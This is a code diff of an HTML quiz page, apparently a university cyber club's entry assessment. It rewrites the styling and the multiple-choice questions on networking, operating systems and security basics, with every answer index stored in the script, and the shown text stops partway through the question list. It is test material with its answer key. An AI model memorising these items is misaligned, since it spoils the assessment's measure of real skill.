@@ -3,21 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cyber Skills Level Assessment</title>
-
+    <title>Cyber Skills Assessment</title>
     <style>
         :root {
             --bg: #080611;
             --panel: #110d1d;
-            --panel2: #171126;
             --line: #342454;
             --purple: #a970ff;
-            --purple2: #7c4dff;
             --text: #f4efff;
             --muted: #b9abc9;
             --red: #ff6b7a;
-            --blue: #7aa7ff;
-            --yellow: #e9c46a;
+            --green: #8dffb5;
         }
 
         * {
@@ -29,18 +25,8 @@
             min-height: 100vh;
             color: var(--text);
             font-family: Inter, Segoe UI, Arial, sans-serif;
-            background: radial-gradient(circle at 18% 8%, rgba(169,112,255,.12), transparent 28%), radial-gradient(circle at 82% 30%, rgba(124,77,255,.08), transparent 28%), linear-gradient(rgba(8,6,17,.92), rgba(8,6,17,.98)), repeating-linear-gradient(0deg, transparent 0 31px, rgba(169,112,255,.025) 32px), repeating-linear-gradient(90deg, transparent 0 31px, rgba(169,112,255,.018) 32px);
+            background: radial-gradient(circle at 18% 8%, rgba(169,112,255,.12), transparent 28%), linear-gradient(rgba(8,6,17,.92), rgba(8,6,17,.98));
         }
-
-            body:before {
-                content: "";
-                position: fixed;
-                inset: 0;
-                pointer-events: none;
-                opacity: .22;
-                background-image: linear-gradient( transparent 95%, rgba(169,112,255,.08) 100% );
-                background-size: 100% 5px;
-            }
 
         .container {
             width: min(1050px, 92%);
@@ -53,28 +39,12 @@
             margin-bottom: 28px;
         }
 
-        .logo {
-            font-size: 42px;
-            color: var(--purple);
-            text-shadow: 0 0 22px rgba(57,255,136,.35);
-            font-weight: 900;
-        }
-
-        .subtitle {
-            color: var(--muted);
-            margin-top: 7px;
-        }
-
         .panel {
-            background: linear-gradient( 145deg, rgba(11,33,24,.96), rgba(5,18,13,.96) );
+            background: rgba(17, 13, 29, 0.95);
             border: 1px solid var(--line);
             border-radius: 18px;
             padding: 28px;
-            box-shadow: 0 0 35px rgba(0,0,0,.4), inset 0 0 35px rgba(169,112,255,.025);
-        }
-
-        h1, h2, h3 {
-            margin-top: 0;
+            box-shadow: 0 0 35px rgba(0,0,0,.4);
         }
 
         label {
@@ -89,16 +59,11 @@
             padding: 14px;
             border-radius: 10px;
             border: 1px solid var(--line);
-            background: #030c08;
+            background: #080512;
             color: var(--text);
             outline: none;
             font-size: 16px;
         }
-
-            input:focus, select:focus {
-                border-color: var(--purple);
-                box-shadow: 0 0 0 3px rgba(169,112,255,.08);
-            }
 
         .btn {
             border: 0;
@@ -111,33 +76,21 @@
             font-size: 15px;
             transition: .2s;
             margin-top: 18px;
+            display: inline-block;
         }
 
             .btn:hover {
                 transform: translateY(-1px);
-                box-shadow: 0 0 22px rgba(169,112,255,.22);
             }
 
             .btn.secondary {
-                background: #102a1e;
+                background: #171126;
                 color: var(--text);
                 border: 1px solid var(--line);
             }
 
-            .btn:disabled {
-                opacity: .5;
-                cursor: not-allowed;
-                transform: none;
-            }
-
         .error {
-            color: #ff8585;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .success {
-            color: #8dffb5;
+            color: var(--red);
             margin-top: 10px;
             display: none;
         }
@@ -159,7 +112,7 @@
 
         .progress {
             height: 8px;
-            background: #0b2118;
+            background: #171126;
             border-radius: 20px;
             overflow: hidden;
             margin-top: 8px;
@@ -169,8 +122,8 @@
                 display: block;
                 height: 100%;
                 background: var(--purple);
-                box-shadow: 0 0 12px var(--purple);
                 width: 0;
+                transition: width 0.3s ease;
             }
 
         .badge {
@@ -179,15 +132,21 @@
             border-radius: 999px;
             border: 1px solid var(--line);
             color: var(--purple);
-            background: rgba(57,255,136,.05);
+            background: rgba(169,112,255,.1);
             font-size: 13px;
             margin-bottom: 12px;
         }
 
         .question {
-            font-size: 22px;
+            font-size: 18px;
             line-height: 1.5;
             margin: 12px 0 20px;
+            white-space: pre-wrap;
+            background: #080512;
+            padding: 16px;
+            border-radius: 10px;
+            border: 1px solid var(--line);
+            font-family: monospace;
         }
 
         .option {
@@ -196,14 +155,12 @@
             margin: 10px 0;
             border: 1px solid var(--line);
             border-radius: 12px;
-            background: #06120c;
+            background: #140e24;
             cursor: pointer;
-            transition: .15s;
         }
 
             .option:hover {
-                border-color: #2b8d5d;
-                background: #0a1d14;
+                border-color: var(--purple);
             }
 
             .option input {
@@ -218,23 +175,26 @@
             gap: 12px;
         }
 
-            .nav .btn {
-                flex: 1;
-            }
-
-        .stage-grid,
-        .result-grid {
+        .stage-grid {
             display: grid;
-            grid-template-columns: repeat(3,1fr);
+            grid-template-columns: repeat(3, 1fr);
             gap: 14px;
+            margin-top: 20px;
         }
 
         .stage-card {
             padding: 18px;
             border: 1px solid var(--line);
             border-radius: 14px;
-            background: #06120c;
+            background: #140e24;
+            cursor: pointer;
+            position: relative;
         }
+
+            .stage-card.completed {
+                border-color: var(--green);
+                background: rgba(141, 255, 181, 0.05);
+            }
 
             .stage-card strong {
                 display: block;
@@ -247,103 +207,31 @@
                 font-size: 14px;
             }
 
-        .score-big {
-            font-size: 48px;
-            font-weight: 900;
-            color: var(--purple);
-        }
-
-        .result-card {
-            padding: 20px;
-            border: 1px solid var(--line);
-            border-radius: 14px;
-            background: #06120c;
-        }
-
-            .result-card h3 {
-                color: var(--purple);
-                margin-bottom: 8px;
-            }
-
-        .small {
-            font-size: 13px;
-            color: var(--muted);
-        }
-
-        .summary {
-            margin-top: 20px;
-            padding: 18px;
-            border-radius: 12px;
-            background: #030c08;
-            border: 1px solid var(--line);
-        }
-
-        .saving {
-            color: var(--yellow);
-            font-size: 14px;
-            margin-top: 12px;
-        }
-
-        .saved {
-            color: #8dffb5;
-            font-size: 14px;
-            margin-top: 12px;
-        }
-
-        .tuwaiq-mark {
-            display: inline-block;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-
-        .mountain {
-            font-size: 34px;
-            line-height: .7;
-            color: var(--purple);
-            font-weight: 900;
-            letter-spacing: -12px;
-            margin-left: -8px;
-            text-shadow: 0 0 18px rgba(169,112,255,.28);
+        .status-tag {
+            font-size: 11px;
+            padding: 3px 8px;
+            border-radius: 10px;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--line);
         }
 
         .english-brand {
-            font-size: 30px;
+            font-size: 28px;
             font-weight: 900;
-            color: #f5efff;
-            line-height: 1.05;
-            margin-top: 5px;
-        }
-
-        .brand-line {
-            height: 1px;
-            width: 180px;
-            margin: 10px auto 8px;
-            background: linear-gradient( 90deg, transparent, var(--purple), transparent );
         }
 
         .cyber-brand {
-            font-size: 14px;
-            letter-spacing: 4px;
+            font-size: 13px;
+            letter-spacing: 3px;
             color: var(--purple);
             font-weight: 800;
         }
 
         @media(max-width:700px) {
-            .stage-grid,
-            .result-grid {
+            .stage-grid {
                 grid-template-columns: 1fr;
-            }
-
-            .logo {
-                font-size: 32px;
-            }
-
-            .panel {
-                padding: 20px;
-            }
-
-            .question {
-                font-size: 19px;
             }
         }
     </style>
@@ -352,1927 +240,330 @@
 <body>
 
     <div class="container">
-
         <header>
-            <div class="tuwaiq-mark">
-                <div class="english-brand">TUWAIQ CLUB OF UOJ</div>
-                <div class="brand-line"></div>
-                <div class="cyber-brand">CYBER SECURITY</div>
-            </div>
-
-            <div class="subtitle">
-                Technical Foundation Level Assessment
-            </div>
+            <div class="english-brand">TUWAIQ CLUB OF UOJ</div>
+            <div class="cyber-brand">CYBER SECURITY ASSESSMENT</div>
         </header>
 
-
-        <!-- ================= START ================= -->
-
+        <!-- START PANEL -->
         <section id="start" class="panel">
-
-            <span class="badge">LEVEL ASSESSMENT</span>
-
-            <h1>Find Your Technical Level</h1>
-
-            <p class="subtitle">
-                This diagnostic assessment measures your current foundation across
-                networking, operating systems, and cybersecurity using theory,
-                troubleshooting, and practical scenarios.
-            </p>
+            <span class="badge">HANDS-ON ASSESSMENT</span>
+            <h1>Technical Skills Assessment</h1>
+            <p style="color:var(--muted)">Select any section directly or pick one from the dropdown.</p>
 
             <label for="name">Full Name</label>
-
-            <input id="name"
-                   type="text"
-                   placeholder="Enter your name">
+            <input id="name" type="text" placeholder="Enter your name">
 
             <label for="major">Choose Your Major</label>
-
             <select id="major">
                 <option value="">Select your major</option>
                 <option>Cybersecurity</option>
                 <option>Data Science</option>
-                <option>Law</option>
                 <option>Software Engineering</option>
                 <option>Computer Science</option>
-                <option>Computer Engineering</option>
-                <option>Artificial Intelligence</option>
                 <option>Information Technology</option>
-                <option>Physics</option>
             </select>
 
+            <label for="sectionSelect">Choose Specific Section</label>
+            <select id="sectionSelect">
+                <option value="ALL">All Sections (Sequential)</option>
+                <option value="0">01 · Networking</option>
+                <option value="1">02 · Operating Systems</option>
+                <option value="2">03 · Cybersecurity</option>
+            </select>
 
-            <div class="stage-grid" style="margin-top:22px">
+            <div style="margin-top:20px; font-weight:bold;">Or click a section directly to start:</div>
 
-                <div class="stage-card">
+            <div class="stage-grid">
+                <div class="stage-card" onclick="startTestWithStage(0)">
+                    <span class="status-tag" id="tag-0">Pending</span>
                     <strong>01 · Networking</strong>
-                    <span>Theory + practical scenarios</span>
+                    <span>5 Theoretical + 7 Practical Questions</span>
                 </div>
 
-                <div class="stage-card">
+                <div class="stage-card" onclick="startTestWithStage(1)">
+                    <span class="status-tag" id="tag-1">Pending</span>
                     <strong>02 · Operating Systems</strong>
-                    <span>Theory + practical commands</span>
+                    <span>5 Theoretical + 7 Practical Questions</span>
                 </div>
 
-                <div class="stage-card">
+                <div class="stage-card" onclick="startTestWithStage(2)">
+                    <span class="status-tag" id="tag-2">Pending</span>
                     <strong>03 · Cybersecurity</strong>
-                    <span>Theory + practical security cases</span>
+                    <span>5 Theoretical + 7 Practical Questions</span>
                 </div>
-
             </div>
 
-
-            <div class="summary" style="margin-top:18px">
-
-                <strong style="color:var(--purple)">
-                    Diagnostic assessment:
-                </strong>
-
-                <span class="small">
-                    Questions are intentionally mixed by difficulty and skill area
-                    so the result identifies where your foundation is strong or weak.
-                </span>
-
-            </div>
-
-
-            <button class="btn" onclick="startTest()">
-                Start Assessment
-            </button>
-
-            <div id="startError" class="error">
-                Please enter your name and choose your major.
-            </div>
-
-            <div id="startSuccess" class="success">
-                Your information has been saved successfully.
-            </div>
-
+            <button class="btn" onclick="startTest()">Start Selected Assessment</button>
+            <div id="startError" class="error">Please enter your name and choose your major.</div>
         </section>
 
-
-        <!-- ================= QUIZ ================= -->
-
+        <!-- QUIZ PANEL -->
         <section id="quiz" class="panel hidden">
-
             <div class="progress-wrap">
-
                 <div class="progress-top">
                     <span id="stageLabel"></span>
                     <span id="qCounter"></span>
                 </div>
-
-                <div class="progress">
-                    <i id="progressBar"></i>
-                </div>
-
+                <div class="progress"><i id="progressBar"></i></div>
             </div>
-
 
             <span class="badge" id="typeBadge"></span>
-
-
             <div id="questionText" class="question"></div>
-
-
             <div id="options"></div>
 
+            <div class="nav">
+                <button class="btn secondary" id="backBtn" onclick="previousQuestion()">Back</button>
+                <button class="btn" id="nextBtn" onclick="nextQuestion()">Next</button>
+            </div>
+        </section>
+
+        <!-- RESULT PANEL -->
+        <section id="result" class="panel hidden">
+            <span class="badge">SECTION COMPLETE</span>
+            <h1>Section Assessment Finished!</h1>
+            <p style="color:var(--muted)">Your results have been automatically saved to the database.</p>
+
+            <div id="resultBox" style="padding: 20px; background: #140e24; border-radius: 12px; margin: 20px 0; border: 1px solid var(--line);"></div>
 
             <div class="nav">
-
-                <button class="btn secondary"
-                        id="backBtn"
-                        onclick="previousQuestion()">
-                    Back
-                </button>
-
-                <button class="btn"
-                        id="nextBtn"
-                        onclick="nextQuestion()">
-                    Next
-                </button>
-
+                <button class="btn secondary" onclick="returnToDashboard()">Return to Main Menu</button>
             </div>
-
-            <div id="saveStatus"></div>
-
         </section>
-
-
-        <!-- ================= RESULT ================= -->
-
-        <section id="result" class="panel hidden">
-
-            <span class="badge">
-                ASSESSMENT COMPLETE
-            </span>
-
-            <h1 id="resultTitle"></h1>
-
-            <p class="subtitle">
-                Your answers have been scored by skill area.
-            </p>
-
-
-            <div class="result-grid" id="resultGrid"></div>
-
-
-            <div class="summary">
-
-                <div class="small">
-                    Total Score
-                </div>
-
-                <div class="score-big" id="totalScore"></div>
-
-                <div id="levelText"></div>
-
-                <p class="small">
-                    Your assessment results and individual answers have been saved
-                    to the assessment database.
-                </p>
-
-            </div>
-
-
-            <button class="btn"
-                    onclick="downloadResult()">
-                Save Result JSON
-            </button>
-
-
-            <button class="btn secondary"
-                    onclick="location.reload()">
-                Take Another Assessment
-            </button>
-
-        </section>
-
     </div>
 
-
     <script>
-
-        /* =========================================================
-           SUPABASE CONFIGURATION
-           ========================================================= */
-
-        const SUPABASE_URL =
-            "https://mmhrjaahdlymvucuyjam.supabase.co";
-
-        const SUPABASE_KEY =
-            "sb_publishable_sJA4yR3zfIcXdDq1__byKQ_pGPo961I";
-
-
-        /* =========================================================
-           QUESTIONS
-           ========================================================= */
+        const SUPABASE_URL = "https://mmhrjaahdlymvucuyjam.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_sJA4yR3zfIcXdDq1__byKQ_pGPo961I";
 
         const stages = [
-
             {
                 name: "Networking",
-
                 questions: [
+                    // 5 Theoretical Questions
+                    { type: "Theoretical", level: "Easy", skill: "IP Addressing", q: "What is the primary function of an IP address on a local network?", o: ["To uniquely identify a device", "To encrypt web traffic", "To speed up the router", "To store webpage files"], a: 0 },
+                    { type: "Theoretical", level: "Easy", skill: "DNS Basics", q: "What is the main role of a DNS (Domain Name System) server?", o: ["Translate domain names into IP addresses", "Protect against malware viruses", "Assign IP addresses automatically", "Compress video streams"], a: 0 },
+                    { type: "Theoretical", level: "Easy", skill: "Port Numbers", q: "Which standard port number is reserved for unencrypted HTTP traffic?", o: ["Port 80", "Port 443", "Port 22", "Port 53"], a: 0 },
+                    { type: "Theoretical", level: "Medium", skill: "Protocols", q: "What is the key difference between TCP and UDP protocols?", o: ["TCP ensures reliable delivery; UDP is faster but unreliable", "UDP guarantees delivery; TCP does not", "TCP is used only for local networks", "UDP is more secure than TCP"], a: 0 },
+                    { type: "Theoretical", level: "Medium", skill: "Network Devices", q: "At which layer of the OSI model does a standard network Switch operate?", o: ["Data Link Layer (Layer 2)", "Network Layer (Layer 3)", "Physical Layer (Layer 1)", "Transport Layer (Layer 4)"], a: 0 },
 
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Networking Basics",
-                        q: "What does a router do?",
-                        o: [
-                            "Connects different networks",
-                            "Stores files",
-                            "Creates passwords",
-                            "Plays videos"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Connectivity",
-                        q: "Which command can you use to test if another computer is reachable?",
-                        o: [
-                            "mkdir",
-                            "ping",
-                            "cd",
-                            "rm"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "MAC Address",
-                        q: "What is a MAC address used for?",
-                        o: [
-                            "Finding a website",
-                            "Identifying a network device",
-                            "Opening a file",
-                            "Creating a user"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "DNS",
-                        q: "You can open a website using its IP, but not its name. What may be the problem?",
-                        o: [
-                            "DNS",
-                            "Keyboard",
-                            "RAM",
-                            "Monitor"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Protocols",
-                        q: "Which protocol is used to connect safely to a Linux server?",
-                        o: [
-                            "HTTP",
-                            "FTP",
-                            "SSH",
-                            "DNS"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "IP Address",
-                        q: "A computer has an IP address that starts with 169.254. What does this usually mean?",
-                        o: [
-                            "It has a public IP",
-                            "It could not get an IP from DHCP",
-                            "It is using SSH",
-                            "It is connected to DNS"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "IP Addressing",
-                        q: "What does a subnet mask help you find?",
-                        o: [
-                            "The network and host parts of an IP",
-                            "The user's password",
-                            "The MAC address",
-                            "The website name"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Default Gateway",
-                        q: "A computer can reach other computers in the same network, but cannot reach the internet. What should you check?",
-                        o: [
-                            "Default gateway",
-                            "Username",
-                            "File name",
-                            "CPU"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "Ports",
-                        q: "Which port is normally used by HTTPS?",
-                        o: [
-                            "21",
-                            "22",
-                            "443",
-                            "53"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Troubleshooting",
-                        q: "Which command can show the path to another computer?",
-                        o: [
-                            "tracert / traceroute",
-                            "mkdir",
-                            "whoami",
-                            "chmod"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "DHCP",
-                        q: "What does DHCP do?",
-                        o: [
-                            "Encrypts files",
-                            "Gives devices IP settings",
-                            "Blocks viruses",
-                            "Creates websites"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "DNS Troubleshooting",
-                        q: "A computer sends DNS requests but gets no answers. What should you check?",
-                        o: [
-                            "Screen settings",
-                            "DNS server connection",
-                            "Mouse settings",
-                            "File permissions"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "Firewall",
-                        q: "What is a firewall mainly used for?",
-                        o: [
-                            "Managing users",
-                            "Controlling network traffic",
-                            "Increasing RAM",
-                            "Saving files"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "NAT",
-                        q: "Many home devices use one public IP address to access the internet. What technology is usually used?",
-                        o: [
-                            "NAT",
-                            "SSH",
-                            "DNS",
-                            "FTP"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "DNS Troubleshooting",
-                        q: "Only one computer cannot open websites by name, but other computers can. What should you check first?",
-                        o: [
-                            "The router's power",
-                            "That computer's DNS settings",
-                            "The monitor",
-                            "The keyboard"
-                        ],
-                        a: 1
-                    }
-
+                    // 7 Practical Questions
+                    { type: "Practical", level: "Easy", skill: "IP Troubleshooting", q: "Scenario: A user cannot open websites. You type 'ping 8.8.8.8' and it replies successfully, but 'ping google.com' fails. What is the issue?", o: ["DNS Server configuration issue", "Network card is unplugged", "Router power is OFF", "IP address conflict"], a: 0 },
+                    { type: "Practical", level: "Easy", skill: "CLI Diagnostics", q: "Scenario: Which command displays all network interfaces and their assigned IP addresses on Windows?", o: ["ipconfig", "ping", "tracert", "netstat"], a: 0 },
+                    { type: "Practical", level: "Easy", skill: "Route Trace", q: "Scenario: A packet stops reaching a destination server. Which command shows every hop/router along the path?", o: ["tracert", "nslookup", "arp -a", "route print"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Port Inspection", q: "Scenario: You run 'netstat -an' on a server and see:\nTCP  0.0.0.0:22  LISTENING\nWhat does this output mean?", o: ["The server is accepting incoming SSH connections", "Port 22 is blocked by firewall", "A file download is complete", "DNS is listening on Port 22"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "DHCP Inspection", q: "Scenario: A PC gets an IP address starting with 169.254.X.X (APIPA). What does this mean?", o: ["Failed to reach the DHCP server", "Connected successfully to Internet", "Static IP configured correctly", "DNS server was rejected"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Subnetting", q: "Scenario: A host has IP 192.168.1.50 with Subnet Mask 255.255.255.0 (/24). How many usable IPs exist in this subnet?", o: ["254", "512", "128", "1024"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Packet Capture", q: "Scenario: In Wireshark, you filter by 'dns'. What packets will be displayed in the analysis window?", o: ["Domain Name resolution queries and responses", "Encrypted HTTPS handshakes", "Ping ICMP ECHO requests", "FTP file transfer packets"], a: 0 }
                 ]
             },
-
-
             {
                 name: "Operating Systems",
-
                 questions: [
+                    // 5 Theoretical Questions
+                    { type: "Theoretical", level: "Easy", skill: "OS Fundamentals", q: "What is the core component of an Operating System that manages CPU and memory?", o: ["Kernel", "GUI Shell", "File Manager", "Web Browser"], a: 0 },
+                    { type: "Theoretical", level: "Easy", skill: "File Systems", q: "Which file system is the default standard for modern Windows operating systems?", o: ["NTFS", "FAT32", "ext4", "exFAT"], a: 0 },
+                    { type: "Theoretical", level: "Easy", skill: "Processes", q: "What is a 'Process' in an operating system environment?", o: ["A program currently executing in memory", "A file saved on the hard drive", "A user account permission", "A network connection"], a: 0 },
+                    { type: "Theoretical", level: "Medium", skill: "Permissions", q: "In Linux file permissions, what does the 'rwx' notation represent?", o: ["Read, Write, and Execute permissions", "Root, Windows, and XML access", "Remote, Web, and eXternal access", "Remove, Wipe, and eXtract"], a: 0 },
+                    { type: "Theoretical", level: "Medium", skill: "Virtual Memory", q: "What is the main function of 'Swap Space' or Virtual Memory?", o: ["Use disk space as extra RAM when RAM is full", "Store permanent user backups", "Encrypt files on boot", "Speed up CPU processing"], a: 0 },
 
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "OS Basics",
-                        q: "What does an operating system do?",
-                        o: [
-                            "Manages the computer and its programs",
-                            "Connects the computer to a TV",
-                            "Creates a new CPU",
-                            "Only stores pictures"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Linux CLI",
-                        q: "Which command shows the folder you are currently in?",
-                        o: [
-                            "cd",
-                            "pwd",
-                            "ls",
-                            "cat"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Processes",
-                        q: "What is a process in an operating system?",
-                        o: [
-                            "A type of file",
-                            "A running program",
-                            "A computer cable",
-                            "A user account"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Linux Files",
-                        q: "Which command shows the files in a Linux folder?",
-                        o: [
-                            "chmod",
-                            "pwd",
-                            "ls",
-                            "mkdir"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Linux Permissions",
-                        q: "Which permission lets you run a file?",
-                        o: [
-                            "Read",
-                            "Write",
-                            "Execute",
-                            "Delete"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Linux Commands",
-                        q: "Which command shows running processes?",
-                        o: [
-                            "ps",
-                            "cd",
-                            "mkdir",
-                            "touch"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "Memory",
-                        q: "What is RAM used for?",
-                        o: [
-                            "Storing data for programs that are running",
-                            "Storing files forever",
-                            "Connecting to Wi-Fi",
-                            "Creating user accounts"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Linux Permissions",
-                        q: "Which command is used to change file permissions?",
-                        o: [
-                            "grep",
-                            "chown",
-                            "chmod",
-                            "pwd"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "Linux Users",
-                        q: "Which user has the highest privileges in Linux?",
-                        o: [
-                            "guest",
-                            "root",
-                            "student",
-                            "user"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Linux Directories",
-                        q: "You want to create a folder called 'logs'. Which command do you use?",
-                        o: [
-                            "cd logs",
-                            "touch logs",
-                            "mkdir logs",
-                            "ls logs"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "File Systems",
-                        q: "What does a file system do?",
-                        o: [
-                            "Manages how files are stored and organized",
-                            "Connects computers to the internet",
-                            "Creates passwords",
-                            "Controls the monitor"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Linux Permissions",
-                        q: "You try to run a script and get 'Permission denied'. What should you check?",
-                        o: [
-                            "The file's execute permission",
-                            "The computer's wallpaper",
-                            "The username only",
-                            "The folder name"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Medium",
-                        skill: "CPU Scheduling",
-                        q: "Why does the operating system use a process scheduler?",
-                        o: [
-                            "To choose which process uses the CPU",
-                            "To create new files",
-                            "To change file names",
-                            "To connect to a printer"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "Troubleshooting",
-                        q: "Your Linux computer is slow. You think one program is using too much CPU. What should you check?",
-                        o: [
-                            "The running processes",
-                            "The keyboard language",
-                            "The desktop wallpaper",
-                            "The file names"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Medium",
-                        skill: "File Ownership",
-                        q: "Which command changes the owner of a file?",
-                        o: [
-                            "chmod",
-                            "chown",
-                            "pwd",
-                            "ls"
-                        ],
-                        a: 1
-                    }
-
+                    // 7 Practical Questions
+                    { type: "Practical", level: "Easy", skill: "Linux Commands", q: "Scenario: You want to list all files in a Linux directory, including hidden files (.files). Which command do you run?", o: ["ls -la", "cd -a", "dir /all", "cat -h"], a: 0 },
+                    { type: "Practical", level: "Easy", skill: "Directory Creation", q: "Scenario: Which command creates a new directory named 'CyberProject' in Linux terminal?", o: ["mkdir CyberProject", "touch CyberProject", "create CyberProject", "newdir CyberProject"], a: 0 },
+                    { type: "Practical", level: "Easy", skill: "File Permissions", q: "Scenario: Which Linux command sets 'script.sh' permissions to give full rights (7) to owner, and read/execute (5) to others?", o: ["chmod 755 script.sh", "chown 755 script.sh", "chmod 644 script.sh", "chmod 777 script.sh"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Process Management", q: "Scenario: A process named 'bad_app' with PID 4321 is freezing the system. How do you terminate it in Linux?", o: ["kill -9 4321", "stop 4321", "close process 4321", "remove 4321"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Log Filtering", q: "Scenario: You want to search for the keyword 'FAILED' in '/var/log/auth.log'. Which command is best?", o: ["grep 'FAILED' /var/log/auth.log", "find /var/log/auth.log 'FAILED'", "cat /var/log/auth.log | locate", "tail -f FAILED"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "System Resource", q: "Scenario: Which command in Linux displays real-time CPU and memory usage of running processes?", o: ["top", "df -h", "uname -a", "ip link"], a: 0 },
+                    { type: "Practical", level: "Medium", skill: "Admin Elevation", q: "Scenario: A regular user gets 'Permission Denied' when updating software. What prefix grants root privileges?", o: ["sudo", "admin", "runas", "root"], a: 0 }
                 ]
             },
-
-
             {
-                name: "Cybersecurity Concepts",
-
+                name: "Cybersecurity",
                 questions: [
+                    // 5 Theoretical Questions
+                    { type: "Theoretical", level: "Easy", skill: "CIA Triad", q: "What does the 'CIA Triad' stand for in Cybersecurity?", o: ["Confidentiality, Integrity, Availability", "Control, Inspection, Authentication", "Cyber, Intelligence, Authorization", "Central, Internal, Access"], a: 0 },
+                    { type: "Theoretical", level: "Easy", skill: "Phishing", q: "What is 'Phishing'?", o: ["Deceptive emails trying to steal sensitive data", "A physical attack on servers", "Overloading a network with fake traffic", "Encrypting files for ransom"], a: 0 },
+                    { type: "Theoretical", level: "Easy", skill: "Malware", q: "Which type of malware encrypts victim files and demands payment for key recovery?", o: ["Ransomware", "Spyware", "Adware", "Trojan"], a: 0 },
+                    { type: "Theoretical", level: "Medium", skill: "Authentication", q: "What is Multi-Factor Authentication (MFA)?", o: ["Requiring two or more verification methods to log in", "Using a password with capital letters and numbers", "Changing your password every 30 days", "Logging in from two devices at once"], a: 0 },
+                    { type: "Theoretical", level: "Medium", skill: "Firewalls", q: "What is the main task of a Network Firewall?", o: ["Filter incoming and outgoing network traffic based on rules", "Scan emails for spelling errors", "Speed up download rates", "Automatically fix software bugs"], a: 0 },
 
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Security Basics",
-                        q: "What does the CIA Triad mean?",
-                        o: [
-                            "Confidentiality, Integrity, Availability",
-                            "Control, Internet, Access",
-                            "Cyber, Information, Authentication",
-                            "Confidentiality, Internet, Authorization"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Phishing",
-                        q: "You get a message with a strange link asking for your password. What should you do?",
-                        o: [
-                            "Click the link",
-                            "Check if the message is real before clicking",
-                            "Send your password",
-                            "Forward the message to friends"
-                        ],
-                        a: 1
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Phishing",
-                        q: "What is phishing?",
-                        o: [
-                            "A type of antivirus",
-                            "A way to back up files",
-                            "A fake message or website used to steal information",
-                            "A type of network cable"
-                        ],
-                        a: 2
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Authentication",
-                        q: "Which is safer than using only a password?",
-                        o: [
-                            "Using a shorter password",
-                            "Sharing your password",
-                            "Turning off security alerts",
-                            "Using multi-factor authentication"
-                        ],
-                        a: 3
-                    },
-
-                    {
-                        type: "Theory",
-                        level: "Easy",
-                        skill: "Malware",
-                        q: "What is malware?",
-                        o: [
-                            "Malicious software",
-                            "A secure website",
-                            "A network device",
-                            "A backup file"
-                        ],
-                        a: 0
-                    },
-
-                    {
-                        type: "Practical",
-                        level: "Easy",
-                        skill: "Password Security",
-                        q: "Which password is stronger?",
-                        o: [
-                            "12345678",
-                            "password",
-                            "Jana2026",
